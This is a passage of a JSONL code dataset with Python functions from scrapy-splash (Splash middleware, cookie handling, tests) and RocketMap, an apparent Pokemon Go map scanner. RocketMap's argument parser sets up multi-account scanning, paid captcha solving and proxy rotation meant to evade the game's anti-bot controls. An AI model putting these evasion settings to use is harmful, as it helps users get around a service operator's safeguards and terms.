{"docstring": "\"\"\"\nReturn a retry request for HTTP 498 responses. HTTP 498 means\nload_args are not present on server; client should retry the request\nwith full argument values instead of their hashes.\n\"\"\"\n", "func_signal": "def _498_retry_request(self, request, response):\n", "code": "meta = copy.deepcopy(request.meta)\nlocal_arg_fingerprints = meta['splash']['_local_arg_fingerprints']\nargs = meta['splash']['args']\nargs.pop('load_args', None)\nargs['save_args'] = list(local_arg_fingerprints.keys())\n\nfor name, fp in local_arg_fingerprints.items():\n    args[name] = self._argument_values[fp]\n    # print('remote_keys before:', self._remote_keys)\n    self._remote_keys.pop(fp, None)\n    # print('remote_keys after:', self._remote_keys)\n\nbody = json.dumps(args, ensure_ascii=False, sort_keys=True, indent=4)\n# print(body)\nrequest = request.replace(\n    meta=meta,\n    body=body,\n    priority=request.priority+self.retry_498_priority_adjust\n)\nreturn request", "path": "scrapy-splash/scrapy_splash/middleware.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "# check 'body' handling and another 'headers' format\n", "func_signal": "def test_magic_response2():\n", "code": "mw = _get_mw()\nreq = SplashRequest('http://example.com/', magic_response=True,\n                    headers={'foo': 'bar'}, dont_send_headers=True)\nreq = mw.process_request(req, None)\nassert 'headers' not in req.meta['splash']['args']\n\nresp_data = {\n    'body': base64.b64encode(b\"binary data\").decode('ascii'),\n    'headers': {'Content-Type': 'text/plain'},\n}\nresp = TextResponse(\"http://mysplash.example.com/execute\",\n                    headers={b'Content-Type': b'application/json'},\n                    body=json.dumps(resp_data).encode('utf8'))\nresp2 = mw.process_response(req, resp, None)\nassert resp2.data == resp_data\nassert resp2.body == b'binary data'\nassert resp2.headers == {b'Content-Type': [b'text/plain']}\nassert resp2.splash_response_headers == {b'Content-Type': [b'application/json']}\nassert resp2.status == resp2.splash_response_status == 200\nassert resp2.url == \"http://example.com/\"", "path": "scrapy-splash/tests/test_middleware.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nConvert a Cookie instance to a dict in HAR cookie format.\n\"\"\"\n", "func_signal": "def cookie_to_har(cookie):\n", "code": "c = {\n    'name': cookie.name,\n    'value': cookie.value,\n    'secure': cookie.secure,\n}\nif cookie.path_specified:\n    c['path'] = cookie.path\n\nif cookie.domain_specified:\n    c['domain'] = cookie.domain\n\nif cookie.expires:\n    tm = time.gmtime(cookie.expires)\n    c['expires'] = time.strftime(\"%Y-%m-%dT%H:%M:%SZ\", tm)\n\nhttp_only = cookie.get_nonstandard_attr('HttpOnly')\nif http_only is not None:\n    c['httpOnly'] = bool(http_only)\n\nif cookie.comment:\n    c['comment'] = cookie.comment\n\nreturn c", "path": "scrapy-splash/scrapy_splash/cookies.py", "commit_date": "2016-04-11 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nConvert scrapy.http.Headers instance to a dictionary\nsuitable for JSON encoding.\n\"\"\"\n", "func_signal": "def scrapy_headers_to_unicode_dict(headers):\n", "code": "return {\n    to_unicode(key): to_unicode(b','.join(value))\n    for key, value in headers.items()\n}", "path": "scrapy-splash/scrapy_splash/utils.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"Create a new Response with the same attributes except for those\ngiven new values.\n\"\"\"\n", "func_signal": "def replace(self, *args, **kwargs):\n", "code": "for x in ['url', 'status', 'headers', 'body', 'request', 'flags',\n          'real_url', 'splash_response_status',\n          'splash_response_headers']:\n    kwargs.setdefault(x, getattr(self, x))\ncls = kwargs.pop('cls', self.__class__)\nreturn cls(*args, **kwargs)", "path": "scrapy-splash/scrapy_splash/response.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "\"\"\"\nFor Splash JSON responses add all cookies from\n'cookies' in a response to the cookiejar.\n\"\"\"\n", "func_signal": "def process_response(self, request, response, spider):\n", "code": "from scrapy_splash import SplashJsonResponse\nif not isinstance(response, SplashJsonResponse):\n    return response\n\nif 'cookies' not in response.data:\n    return response\n\nif 'splash' not in request.meta:\n    return response\n\nif not request.meta.get('_splash_processed'):\n    warnings.warn(\"SplashCookiesMiddleware requires SplashMiddleware\")\n    return response\n\nsplash_options = request.meta['splash']\nsession_id = splash_options.get('new_session_id',\n                                splash_options.get('session_id'))\nif session_id is None:\n    return response\n\njar = self.jars[session_id]\nrequest_cookies = splash_options['args'].get('cookies', [])\nhar_to_jar(jar, response.data['cookies'], request_cookies)\nself._debug_set_cookie(response, spider)\nresponse.cookiejar = jar\nreturn response", "path": "scrapy-splash/scrapy_splash/middleware.py", "commit_date": "2018-01-16 00:00:00", "repo_name": "scrapy-plugins/scrapy-splash", "stars": 3063, "license": "bsd-3-clause", "language": "python", "size": 222}
{"docstring": "# Cause the randomness to only shift every N minutes (thus new pokes\n# every N minutes)\n", "func_signal": "def makeWildPokemon(location):\n", "code": "offset = int(time() % 3600) / 10\nseedid = str(location[0]) + str(location[1]) + str(offset)\nseed(seedid)\n\n# Now, collect the pokes for this can point\npokes = []\nfor i in range(randint(0, 2)):\n    coords = getRandomPoint(location)\n    ll = LatLng.from_degrees(coords[0], coords[1])\n    cellId = CellId.from_lat_lng(ll).parent(20).to_token()\n    pokes.append({\n        'encounter_id': 'pkm' + seedid + str(i),\n        'last_modified_timestamp_ms': int((time() - 10) * 1000),\n        'latitude': coords[0],\n        'longitude': coords[1],\n        'pokemon_data': {'pokemon_id': randint(1, 140)},\n        'spawn_point_id': cellId,\n        'time_till_hidden_ms': randint(60, 600) * 1000\n    })\nreturn pokes", "path": "RocketMap/contrib/fake-pgo-api.py", "commit_date": "2017-02-20 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Fake a 24 hour auth token.\n", "func_signal": "def __init__(self, mock):\n", "code": "self._auth_provider = type('', (object,), {\n    \"_ticket_expire\": (time() + (3600 * 24)) * 1000})()\nself.inited = False\nself.mock = mock", "path": "RocketMap/pogom/fakePogoApi.py", "commit_date": "2017-01-23 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Meters radius (very, very rough approximation -- deal with it.)\n", "func_signal": "def set_position(self, lat, lng, alt):\n", "code": "if not self.inited:\n    args = get_args()\n    radius = 140 * args.step_limit\n    requests.get('{}/login/{}/{}/{}'.format(\n        self.mock, lat, lng, radius))\n    self.inited = True", "path": "RocketMap/pogom/fakePogoApi.py", "commit_date": "2017-01-23 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Find the reverse geolocation\n", "func_signal": "def gmaps_reverse_geolocate(gmaps_key, locale, location):\n", "code": "geolocator = GoogleV3(api_key=gmaps_key)\n\nplayer_locale = {\n    'country': 'US',\n    'language': locale,\n    'timezone': 'America/Denver'\n}\n\ntry:\n    reverse = geolocator.reverse(location)\n    address = reverse[-1].raw['address_components']\n    country_code = 'US'\n\n    # Find country component.\n    for component in address:\n        # Look for country.\n        component_is_country = any([t == 'country'\n                                    for t in component.get('types', [])])\n\n        if component_is_country:\n            country_code = component['short_name']\n            break\n\n    try:\n        timezone = geolocator.timezone(location)\n        player_locale.update({\n            'country': country_code,\n            'timezone': str(timezone)\n        })\n    except Exception as e:\n        log.exception('Exception on Google Timezone API. '\n                      + 'Please check that you have Google Timezone API'\n                      + ' enabled for your API key'\n                      + ' (https://developers.google.com/maps/'\n                      + 'documentation/timezone/intro): %s.', e)\nexcept Exception as e:\n    log.exception('Exception while obtaining player locale: %s.'\n                  + ' Using default locale.', e)\n\nreturn player_locale", "path": "RocketMap/pogom/utils.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# If we import at the top, pogom.models will import pogom.utils,\n# causing the cyclic import to make some things unavailable.\n", "func_signal": "def dynamic_rarity_refresher():\n", "code": "from pogom.models import Pokemon\n\n# Refresh every x hours.\nargs = get_args()\nhours = args.rarity_hours\nroot_path = args.root_path\n\nrarities_path = os.path.join(root_path, 'static/dist/data/rarity.json')\nupdate_frequency_mins = args.rarity_update_frequency\nrefresh_time_sec = update_frequency_mins * 60\n\nwhile True:\n    log.info('Updating dynamic rarity...')\n\n    start = default_timer()\n    db_rarities = Pokemon.get_spawn_counts(hours)\n    total = db_rarities['total']\n    pokemon = db_rarities['pokemon']\n\n    # Store as an easy lookup table for front-end.\n    rarities = {}\n\n    for poke in pokemon:\n        rarities[poke['pokemon_id']] = get_pokemon_rarity(total,\n                                                          poke['count'])\n\n    # Save to file.\n    with open(rarities_path, 'w') as outfile:\n        json.dump(rarities, outfile)\n\n    duration = default_timer() - start\n    log.info('Updated dynamic rarity. It took %.2fs for %d entries.',\n             duration,\n             total)\n\n    # Wait x seconds before next refresh.\n    log.debug('Waiting %d minutes before next dynamic rarity update.',\n              refresh_time_sec / 60)\n    time.sleep(refresh_time_sec)", "path": "RocketMap/pogom/utils.py", "commit_date": "2018-03-22 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Parse geofence file.\n", "func_signal": "def update_ex_gyms(geofence):\n", "code": "log.info('Finding border points from geofence.')\ngeofence = Geofences.parse_geofences_file(geofence, '')\nfence = geofence[0]['polygon']\n\n# Figure out borders for bounding box.\nsouth = min(fence, key=lambda ev: ev['lat'])['lat']\nwest = min(fence, key=lambda ev: ev['lon'])['lon']\nnorth = max(fence, key=lambda ev: ev['lat'])['lat']\neast = max(fence, key=lambda ev: ev['lon'])['lon']\n\nlog.info('Finding parks within zone.')\nex_gyms = ex_query(south, west, north, east)\ngyms = Gym.get_gyms(south, west, north, east)\n\nif not gyms:\n    log.error('No gyms detected within geofence, exiting.')\n    exit(1)\n\nlog.info(\n    'Checking {} gyms against {} parks.'.format(len(gyms),\n                                                len(ex_gyms.ways)))\n# Retrieve list of confirmed EX gyms to update the DB.\nconfirmed_ex_gyms = filter(lambda gym: __gym_is_ex_gym(gym, ex_gyms),\n                           gyms.values())\n\nif not confirmed_ex_gyms:\n    log.info('No EX-eligible gyms found.')\n    exit(1)\nGym.set_gyms_in_park(confirmed_ex_gyms, True)", "path": "RocketMap/pogom/osm.py", "commit_date": "2018-03-01 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Get terminal width.\n# src: How do I find the width & height of a terminal window?\n# url: http://stackoverflow.com/q/263890/1706351\n", "func_signal": "def _get_terminal_size_tput():\n", "code": "try:\n    cols = int(subprocess.check_call(shlex.split('tput cols')))\n    rows = int(subprocess.check_call(shlex.split('tput lines')))\n    return (cols, rows)\nexcept Exception:\n    pass", "path": "RocketMap/pogom/terminalsize.py", "commit_date": "2017-11-01 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Query Overpass for known gym areas.\n", "func_signal": "def ex_query(s, w, n, e):\n", "code": "api = Overpass()\nresult = api.query(\"\"\"\n[out:json]\n[date:\"2016-07-10T00:00:00Z\"]\n[timeout:620]\n[bbox:{},{},{},{}];\n(\n    // Tags that are confirmed to classify gyms as 'parks' for EX Raids.\n    way[leisure=park];\n    way[landuse=recreation_ground];\n    way[leisure=recreation_ground];\n    way[leisure=pitch];\n    way[leisure=garden];\n    way[leisure=golf_course];\n    way[leisure=playground];\n    way[landuse=meadow];\n    way[landuse=grass];\n    way[landuse=greenfield];\n    way[natural=scrub];\n    way[natural=heath];\n    way[natural=grassland];\n    way[landuse=farmyard];\n    way[landuse=vineyard];\n    way[landuse=farmland];\n    way[landuse=orchard];\n);\nout body;\n>;\nout skel qt;\n\"\"\".format(s, w, n, e))\n\nreturn result", "path": "RocketMap/pogom/osm.py", "commit_date": "2018-03-01 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "\"\"\"\nGiven an initial lat/lng, a distance(in kms), and a bearing (degrees),\nthis will calculate the resulting lat/lng coordinates.\n\"\"\"\n", "func_signal": "def get_new_coords(init_loc, distance, bearing):\n", "code": "origin = geopy.Point(init_loc[0], init_loc[1])\ndestination = geopy.distance.distance(kilometers=distance).destination(\n    origin, bearing)\nreturn (destination.latitude, destination.longitude)", "path": "RocketMap/pogom/transform.py", "commit_date": "2018-01-07 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Pre-check to see if the -cf or --config flag is used on the command line.\n# If not, we'll use the env var or default value. This prevents layering of\n# config files as well as a missing config.ini.\n", "func_signal": "def get_args():\n", "code": "defaultconfigfiles = []\nif '-cf' not in sys.argv and '--config' not in sys.argv:\n    defaultconfigfiles = [os.getenv('POGOMAP_CONFIG', os.path.join(\n        os.path.dirname(__file__), '../config/config.ini'))]\nparser = configargparse.ArgParser(\n    default_config_files=defaultconfigfiles,\n    auto_env_var_prefix='POGOMAP_')\nparser.add_argument('-cf', '--config',\n                    is_config_file=True, help='Set configuration file')\nparser.add_argument('-scf', '--shared-config',\n                    is_config_file=True, help='Set a shared config')\nparser.add_argument('-a', '--auth-service', type=str.lower,\n                    action='append', default=[],\n                    help=('Auth Services, either one for all accounts ' +\n                          'or one per account: ptc or google. Defaults ' +\n                          'all to ptc.'))\nparser.add_argument('-u', '--username', action='append', default=[],\n                    help='Usernames, one per account.')\nparser.add_argument('-p', '--password', action='append', default=[],\n                    help=('Passwords, either single one for all ' +\n                          'accounts or one per account.'))\nparser.add_argument('-w', '--workers', type=int,\n                    help=('Number of search worker threads to start. ' +\n                          'Defaults to the number of accounts specified.'))\nparser.add_argument('-asi', '--account-search-interval', type=int,\n                    default=0,\n                    help=('Seconds for accounts to search before ' +\n                          'switching to a new account. 0 to disable.'))\nparser.add_argument('-ari', '--account-rest-interval', type=int,\n                    default=7200,\n                    help=('Seconds for accounts to rest when they fail ' +\n                          'or are switched out.'))\nparser.add_argument('-ac', '--accountcsv',\n                    help=('Load accounts from CSV file containing ' +\n                          '\"auth_service,username,password\" lines.'))\nparser.add_argument('-hlvl', '--high-lvl-accounts',\n                    help=('Load high level accounts from CSV file '\n                          + ' containing '\n                          + '\"auth_service,username,password\"'\n                          + ' lines.'))\nparser.add_argument('-bh', '--beehive',\n                    help=('Use beehive configuration for multiple ' +\n                          'accounts, one account per hex.  Make sure ' +\n                          'to keep -st under 5, and -w under the total ' +\n                          'amount of accounts available.'),\n                    action='store_true', default=False)\nparser.add_argument('-wph', '--workers-per-hive',\n                    help=('Only referenced when using --beehive. Sets ' +\n                          'number of workers per hive. Default value ' +\n                          'is 1.'),\n                    type=int, default=1)\nparser.add_argument('-l', '--location', type=parse_unicode,\n                    help='Location, can be an address or coordinates.')\n# Default based on the average elevation of cities around the world.\n# Source: https://www.wikiwand.com/en/List_of_cities_by_elevation\nparser.add_argument('-alt', '--altitude',\n                    help='Default altitude in meters.',\n                    type=int, default=507)\nparser.add_argument('-altv', '--altitude-variance',\n                    help='Variance for --altitude in meters',\n                    type=int, default=1)\nparser.add_argument('-uac', '--use-altitude-cache',\n                    help=('Query the Elevation API for each step,' +\n                          ' rather than only once, and store results in' +\n                          ' the database.'),\n                    action='store_true', default=False)\nparser.add_argument('-j', '--jitter',\n                    help=('Apply random -5m to +5m jitter to ' +\n                          'location.'),\n                    action='store_true', default=False)\nparser.add_argument('-al', '--access-logs',\n                    help=(\"Write web logs to access.log.\"),\n                    action='store_true', default=False)\nparser.add_argument('-st', '--step-limit', help='Steps.', type=int,\n                    default=12)\nparser.add_argument('-gf', '--geofence-file',\n                    help=('Geofence file to define outer borders of the ' +\n                          'scan area.'),\n                    default='')\nparser.add_argument('-gef', '--geofence-excluded-file',\n                    help=('File to define excluded areas inside scan ' +\n                          'area. Regarded this as inverted geofence. ' +\n                          'Can be combined with geofence-file.'),\n                    default='')\nparser.add_argument('-sd', '--scan-delay',\n                    help='Time delay between requests in scan threads.',\n                    type=float, default=10)\nparser.add_argument('--spawn-delay',\n                    help=('Number of seconds after spawn time to wait ' +\n                          'before scanning to be sure the Pokemon ' +\n                          'is there.'),\n                    type=float, default=10)\nparser.add_argument('-enc', '--encounter',\n                    help='Start an encounter to gather IVs and moves.',\n                    action='store_true', default=False)\nparser.add_argument('-cs', '--captcha-solving',\n                    help='Enables captcha solving.',\n                    action='store_true', default=False)\nparser.add_argument('-ck', '--captcha-key',\n                    help='2Captcha API key.')\nparser.add_argument('-cds', '--captcha-dsk',\n                    help='Pokemon Go captcha data-sitekey.',\n                    default=\"6LeeTScTAAAAADqvhqVMhPpr_vB9D364Ia-1dSgK\")\nparser.add_argument('-mcd', '--manual-captcha-domain',\n                    help='Domain to where captcha tokens will be sent.',\n                    default=\"http://127.0.0.1:5000\")\nparser.add_argument('-mcr', '--manual-captcha-refresh',\n                    help='Time available before captcha page refreshes.',\n                    type=int, default=30)\nparser.add_argument('-mct', '--manual-captcha-timeout',\n                    help='Maximum time captchas will wait for manual ' +\n                    'captcha solving. On timeout, if enabled, 2Captcha ' +\n                    'will be used to solve captcha. Default is 0.',\n                    type=int, default=0)\nparser.add_argument('-ed', '--encounter-delay',\n                    help=('Time delay between encounter pokemon ' +\n                          'in scan threads.'),\n                    type=float, default=1)\nparser.add_argument('-ignf', '--ignorelist-file',\n                    default='', help='File containing a list of ' +\n                    'Pokemon IDs to ignore, one line per ID. ' +\n                    'Spawnpoints will be saved, but ignored ' +\n                    'Pokemon won\\'t be encountered, sent to ' +\n                    'webhooks or saved to the DB.')\nparser.add_argument('-encwf', '--enc-whitelist-file',\n                    default='', help='File containing a list of '\n                    'Pokemon IDs to encounter for'\n                    ' IV/CP scanning. One line per ID.')\nparser.add_argument('-nostore', '--no-api-store',\n                    help=(\"Don't store the API objects used by the high\"\n                          + ' level accounts in memory. This will increase'\n                          + ' the number of logins per account, but '\n                          + ' decreases memory usage.'),\n                    action='store_true', default=False)\nparser.add_argument('-apir', '--api-retries',\n                    help=('Number of times to retry an API request.'),\n                    type=int, default=3)\nwebhook_list = parser.add_mutually_exclusive_group()\nwebhook_list.add_argument('-wwht', '--webhook-whitelist',\n                          action='append', default=[],\n                          help=('List of Pokemon to send to '\n                                'webhooks. Specified as Pokemon ID.'))\nwebhook_list.add_argument('-wblk', '--webhook-blacklist',\n                          action='append', default=[],\n                          help=('List of Pokemon NOT to send to '\n                                'webhooks. Specified as Pokemon ID.'))\nwebhook_list.add_argument('-wwhtf', '--webhook-whitelist-file',\n                          default='', help='File containing a list of '\n                                           'Pokemon IDs to be sent to '\n                                           'webhooks.')\nwebhook_list.add_argument('-wblkf', '--webhook-blacklist-file',\n                          default='', help='File containing a list of '\n                                           'Pokemon IDs NOT to be sent to'\n                                           'webhooks.')\nparser.add_argument('-ld', '--login-delay',\n                    help='Time delay between each login attempt.',\n                    type=float, default=6)\nparser.add_argument('-lr', '--login-retries',\n                    help=('Number of times to retry the login before ' +\n                          'refreshing a thread.'),\n                    type=int, default=3)\nparser.add_argument('-mf', '--max-failures',\n                    help=('Maximum number of failures to parse ' +\n                          'locations before an account will go into a ' +\n                          'sleep for -ari/--account-rest-interval ' +\n                          'seconds.'),\n                    type=int, default=5)\nparser.add_argument('-me', '--max-empty',\n                    help=('Maximum number of empty scans before an ' +\n                          'account will go into a sleep for ' +\n                          '-ari/--account-rest-interval seconds.' +\n                          'Reasonable to use with proxies.'),\n                    type=int, default=0)\nparser.add_argument('-bsr', '--bad-scan-retry',\n                    help=('Number of bad scans before giving up on a ' +\n                          'step. Default 2, 0 to disable.'),\n                    type=int, default=2)\nparser.add_argument('-msl', '--min-seconds-left',\n                    help=('Time that must be left on a spawn before ' +\n                          'considering it too late and skipping it. ' +\n                          'For example 600 would skip anything with ' +\n                          '< 10 minutes remaining. Default 0.'),\n                    type=int, default=0)\nparser.add_argument('-dc', '--display-in-console',\n                    help='Display Found Pokemon in Console.',\n                    action='store_true', default=False)\nparser.add_argument('-H', '--host', help='Set web server listening host.',\n                    default='127.0.0.1')\nparser.add_argument('-P', '--port', type=int,\n                    help='Set web server listening port.', default=5000)\nparser.add_argument('-L', '--locale',\n                    help=('Locale for Pokemon names (check' +\n                          ' static/dist/locales for more).'),\n                    default='en')\nparser.add_argument('-c', '--china',\n                    help='Coordinates transformer for China.',\n                    action='store_true')\nparser.add_argument('-m', '--mock', type=str,\n                    help=('Mock mode - point to a fpgo endpoint instead ' +\n                          'of using the real PogoApi, ec: ' +\n                          'http://127.0.0.1:9090'),\n                    default='')\nparser.add_argument('-ns', '--no-server',\n                    help=('No-Server Mode. Starts the searcher but not ' +\n                          'the Webserver.'),\n                    action='store_true', default=False)\nparser.add_argument('-os', '--only-server',\n                    help=('Server-Only Mode. Starts only the Webserver ' +\n                          'without the searcher.'),\n                    action='store_true', default=False)\nparser.add_argument('-sc', '--search-control',\n                    help='Enables search control.',\n                    action='store_true', dest='search_control',\n                    default=False)\nparser.add_argument('-nfl', '--no-fixed-location',\n                    help='Disables a fixed map location and shows the ' +\n                    'search bar for use in shared maps.',\n                    action='store_false', dest='fixed_location',\n                    default=True)\nparser.add_argument('-k', '--gmaps-key',\n                    help='Google Maps Javascript API Key.',\n                    required=True)\nparser.add_argument('--skip-empty',\n                    help=('Enables skipping of empty cells in normal ' +\n                          'scans - requires previously populated ' +\n                          'database (not to be used with -ss)'),\n                    action='store_true', default=False)\nparser.add_argument('-C', '--cors', help='Enable CORS on web server.',\n                    action='store_true', default=False)\nparser.add_argument('-cd', '--clear-db',\n                    help=('Deletes the existing database before ' +\n                          'starting the Webserver.'),\n                    action='store_true', default=False)\nparser.add_argument('-np', '--no-pokemon',\n                    help=('Disables Pokemon from the map (including ' +\n                          'parsing them into local db.)'),\n                    action='store_true', default=False)\nparser.add_argument('-ng', '--no-gyms',\n                    help=('Disables Gyms from the map (including ' +\n                          'parsing them into local db).'),\n                    action='store_true', default=False)\nparser.add_argument('-nr', '--no-raids',\n                    help=('Disables Raids from the map (including ' +\n                          'parsing them into local db).'),\n                    action='store_true', default=False)\nparser.add_argument('-nk', '--no-pokestops',\n                    help=('Disables PokeStops from the map (including ' +\n                          'parsing them into local db).'),\n                    action='store_true', default=False)\nparser.add_argument('-ss', '--spawnpoint-scanning',\n                    help=('Use spawnpoint scanning (instead of hex ' +\n                          'grid). Scans in a circle based on step_limit ' +\n                          'when on DB.'),\n                    action='store_true', default=False)\nparser.add_argument('-ssct', '--ss-cluster-time',\n                    help=('Time threshold in seconds for spawn point ' +\n                          'clustering (0 to disable).'),\n                    type=int, default=0)\nparser.add_argument('-speed', '--speed-scan',\n                    help=('Use speed scanning to identify spawn points ' +\n                          'and then scan closest spawns.'),\n                    action='store_true', default=False)\nparser.add_argument('-spin', '--pokestop-spinning',\n                    help=('Spin Pokestops with 50%% probability.'),\n                    action='store_true', default=False)\nparser.add_argument('-ams', '--account-max-spins',\n                    help='Maximum number of Pokestop spins per hour.',\n                    type=int, default=20)\nparser.add_argument('-kph', '--kph',\n                    help=('Set a maximum speed in km/hour for scanner ' +\n                          'movement. Default: 35, 0 to disable.'),\n                    type=int, default=35)\nparser.add_argument('-hkph', '--hlvl-kph',\n                    help=('Set a maximum speed in km/hour for scanner ' +\n                          'movement, for high-level (L30) accounts. ' +\n                          'Default: 25, 0 to disable.'),\n                    type=int, default=25)\nparser.add_argument('-ldur', '--lure-duration',\n                    help=('Change duration for lures set on pokestops. ' +\n                          'This is useful for events that extend lure ' +\n                          'duration.'), type=int, default=30)\nparser.add_argument('-px', '--proxy',\n                    help='Proxy url (e.g. socks5://127.0.0.1:9050)',\n                    action='append')\nparser.add_argument('-pxsc', '--proxy-skip-check',\n                    help='Disable checking of proxies before start.',\n                    action='store_true', default=False)\nparser.add_argument('-pxt', '--proxy-test-timeout',\n                    help='Timeout settings for proxy checker in seconds.',\n                    type=int, default=5)\nparser.add_argument('-pxre', '--proxy-test-retries',\n                    help=('Number of times to retry sending proxy ' +\n                          'test requests on failure.'),\n                    type=int, default=0)\nparser.add_argument('-pxbf', '--proxy-test-backoff-factor',\n                    help=('Factor (in seconds) by which the delay ' +\n                          'until next retry will increase.'),\n                    type=float, default=0.25)\nparser.add_argument('-pxc', '--proxy-test-concurrency',\n                    help=('Async requests pool size.'), type=int,\n                    default=0)\nparser.add_argument('-pxd', '--proxy-display',\n                    help=('Display info on which proxy being used ' +\n                          '(index or full). To be used with -ps.'),\n                    type=str, default='index')\nparser.add_argument('-pxf', '--proxy-file',\n                    help=('Load proxy list from text file (one proxy ' +\n                          'per line), overrides -px/--proxy.'))\nparser.add_argument('-pxr', '--proxy-refresh',\n                    help=('Period of proxy file reloading, in seconds. ' +\n                          'Works only with -pxf/--proxy-file. ' +\n                          '(0 to disable).'),\n                    type=int, default=0)\nparser.add_argument('-pxo', '--proxy-rotation',\n                    help=('Enable proxy rotation with account changing ' +\n                          'for search threads (none/round/random).'),\n                    type=str, default='round')\ngroup = parser.add_argument_group('Database')\ngroup.add_argument(\n    '--db-name', help='Name of the database to be used.', required=True)\ngroup.add_argument(\n    '--db-user', help='Username for the database.', required=True)\ngroup.add_argument(\n    '--db-pass', help='Password for the database.', required=True)\ngroup.add_argument(\n    '--db-host',\n    help='IP or hostname for the database.',\n    default='127.0.0.1')\ngroup.add_argument(\n    '--db-port', help='Port for the database.', type=int, default=3306)\ngroup.add_argument(\n    '--db-threads',\n    help=('Number of db threads; increase if the db ' +\n          'queue falls behind.'),\n    type=int,\n    default=1)\ngroup = parser.add_argument_group('Database Cleanup')\ngroup.add_argument('-DC', '--db-cleanup',\n                   help='Enable regular database cleanup thread.',\n                   action='store_true', default=False)\ngroup.add_argument('-DCw', '--db-cleanup-worker',\n                   help=('Clear worker status from database after X ' +\n                         'minutes of inactivity. ' +\n                         'Default: 30, 0 to disable.'),\n                   type=int, default=30)\ngroup.add_argument('-DCp', '--db-cleanup-pokemon',\n                   help=('Clear pokemon from database X hours ' +\n                         'after they disappeared. ' +\n                         'Default: 0, 0 to disable.'),\n                   type=int, default=0)\ngroup.add_argument('-DCg', '--db-cleanup-gym',\n                   help=('Clear gym details from database X hours ' +\n                         'after last gym scan. ' +\n                         'Default: 8, 0 to disable.'),\n                   type=int, default=8)\ngroup.add_argument('-DCs', '--db-cleanup-spawnpoint',\n                   help=('Clear spawnpoint from database X hours ' +\n                         'after last valid scan. ' +\n                         'Default: 720, 0 to disable.'),\n                   type=int, default=720)\ngroup.add_argument('-DCf', '--db-cleanup-forts',\n                   help=('Clear gyms and pokestops from database X hours '\n                         'after last valid scan. '\n                         'Default: 0, 0 to disable.'),\n                   type=int, default=0)\nparser.add_argument(\n    '-wh',\n    '--webhook',\n    help='Define URL(s) to POST webhook information to.',\n    default=None,\n    dest='webhooks',\n    action='append')\nparser.add_argument('-gi', '--gym-info',\n                    help=('Get all details about gyms (causes an ' +\n                          'additional API hit for every gym).'),\n                    action='store_true', default=False)\nparser.add_argument(\n    '--wh-types',\n    help=('Defines the type of messages to send to webhooks.'),\n    choices=[\n        'pokemon', 'gym', 'raid', 'egg', 'tth', 'gym-info',\n        'pokestop', 'lure', 'captcha'\n    ],\n    action='append',\n    default=[])\nparser.add_argument('--wh-threads',\n                    help=('Number of webhook threads; increase if the ' +\n                          'webhook queue falls behind.'),\n                    type=int, default=1)\nparser.add_argument('-whc', '--wh-concurrency',\n                    help=('Async requests pool size.'), type=int,\n                    default=25)\nparser.add_argument('-whr', '--wh-retries',\n                    help=('Number of times to retry sending webhook ' +\n                          'data on failure.'),\n                    type=int, default=3)\nparser.add_argument('-whct', '--wh-connect-timeout',\n                    help=('Connect timeout (in seconds) for webhook' +\n                          ' requests.'),\n                    type=float, default=1.0)\nparser.add_argument('-whrt', '--wh-read-timeout',\n                    help=('Read timeout (in seconds) for webhook' +\n                          'requests.'),\n                    type=float, default=1.0)\nparser.add_argument('-whbf', '--wh-backoff-factor',\n                    help=('Factor (in seconds) by which the delay ' +\n                          'until next retry will increase.'),\n                    type=float, default=0.25)\nparser.add_argument('-whlfu', '--wh-lfu-size',\n                    help='Webhook LFU cache max size.', type=int,\n                    default=2500)\nparser.add_argument('-whfi', '--wh-frame-interval',\n                    help=('Minimum time (in ms) to wait before sending the'\n                          + ' next webhook data frame.'), type=int,\n                    default=500)\nparser.add_argument('--ssl-certificate',\n                    help='Path to SSL certificate file.')\nparser.add_argument('--ssl-privatekey',\n                    help='Path to SSL private key file.')\nparser.add_argument('-ps', '--print-status',\n                    help=('Show a status screen instead of log ' +\n                          'messages. Can switch between status and ' +\n                          'logs by pressing enter.  Optionally specify ' +\n                          '\"logs\" to startup in logging mode.'),\n                    nargs='?', const='status', default=False,\n                    metavar='logs')\nparser.add_argument('-slt', '--stats-log-timer',\n                    help='In log view, list per hr stats every X seconds',\n                    type=int, default=0)\nparser.add_argument('-sn', '--status-name', default=str(os.getpid()),\n                    help=('Enable status page database update using ' +\n                          'STATUS_NAME as main worker name.'))\nparser.add_argument('-hk', '--hash-key', default=None, action='append',\n                    help='Key for hash server.')\nparser.add_argument('-hs', '--hash-service', default='bossland', type=str,\n                    help=('Hash service name. Supports bossland and'\n                          ' devkat 